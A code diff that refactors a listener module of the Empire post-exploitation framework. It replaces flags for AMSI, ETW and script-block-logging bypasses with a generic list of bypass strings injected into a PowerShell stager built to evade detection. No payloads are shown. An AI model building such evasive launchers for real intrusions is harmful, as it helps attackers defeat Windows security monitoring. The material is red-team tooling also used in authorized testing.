@@ -6,11 +6,11 @@ import os
 import random
 from builtins import object
 from builtins import str
+from typing import List
 
-from empire.server.common import bypasses
-# Empire imports
 from empire.server.common import helpers
 from empire.server.common import packets
+from empire.server.utils import data_util
 
 
 class Listener(object):
@@ -109,10 +109,13 @@ class Listener(object):
         return True
 
 
-    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False, ETWBypass=False):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default',
+                          proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='',
+                          listenerName=None, bypasses: List[str]=None):
         """
         Generate a basic launcher for the specified listener.
         """
+        bypasses = [] if bypasses is None else bypasses
 
         if not language:
             print(helpers.color('[!] listeners/http_hop generate_launcher(): no language specified!'))
@@ -134,17 +137,8 @@ class Listener(object):
                 stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
                     stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
-                    # ScriptBlock Logging bypass
-                    if scriptLogBypass:
-                        stager += bypasses.scriptBlockLogBypass()
-                    if ETWBypass:
-                        stager += bypasses.ETWBypass()
-                    # @mattifestation's AMSI bypass
-                    if AMSIBypass:
-                        stager += bypasses.AMSIBypass()
-                    # rastamouse AMSI bypass
-                    if AMSIBypass2:
-                        stager += bypasses.AMSIBypass2()
+                    for bypass in bypasses:
+                        stager += bypass
                     stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
@@ -482,7 +476,7 @@ def send_message(packets=None):
         """
 
         redirectListenerName = self.options['RedirectListener']['Value']
-        redirectListenerOptions = helpers.get_listener_options(redirectListenerName)
+        redirectListenerOptions = data_util.get_listener_options(redirectListenerName)
 
         if redirectListenerOptions:
 
